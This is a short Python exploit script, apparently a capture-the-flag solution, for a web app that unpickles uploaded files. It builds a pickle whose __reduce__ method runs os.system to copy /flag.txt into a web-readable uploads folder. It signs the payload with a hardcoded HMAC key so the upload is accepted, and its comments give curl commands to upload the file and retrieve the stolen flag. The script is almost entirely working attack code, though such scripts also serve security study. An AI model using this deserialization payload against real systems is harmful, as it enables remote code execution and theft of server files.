# attack scenario (test)
# this is the script file which the attacker uses in his local PC
import pickle, os, hashlib, hmac

# print(os.path.abspath("app/uploads"))
UPLOAD_DIR = '/app/uploads'
uuid = "d7fead3b-245b-4be8-8164-4323fe23830d"

class RCE:
    def __reduce__(self):
        return (os.system, (f"cat /flag.txt > {UPLOAD_DIR}/{uuid}/hacked.txt",))

SECRET_KEY = "pickle_tickle"
payload = pickle.dumps(RCE())
sig = hmac.new(SECRET_KEY.encode(), payload, hashlib.sha256).hexdigest()

with open("malicious.pkl", "wb") as f:
    f.write(payload)

print(f"HMAC signature: {sig}")

# hacker then uploads the malicious.pkl file on the website
'''
curl -X POST http://127.0.0.1:5000/upload \
  -F "file=@malicious.pkl" \
  -F "sig=90c67aeb218e5272a9510e48ab54d6e14e1fec35db2e5a31bb9c9ac9d0809ed0" \
  -F "uuid=d7fead3b-245b-4be8-8164-4323fe23830d"
  
  '''

# 1. generate hacked.txt below app/uploads/{your_uuid}
# 2. check the flag by $ curl http://localhost:916/uploads/{your_uuid}/hacked.txt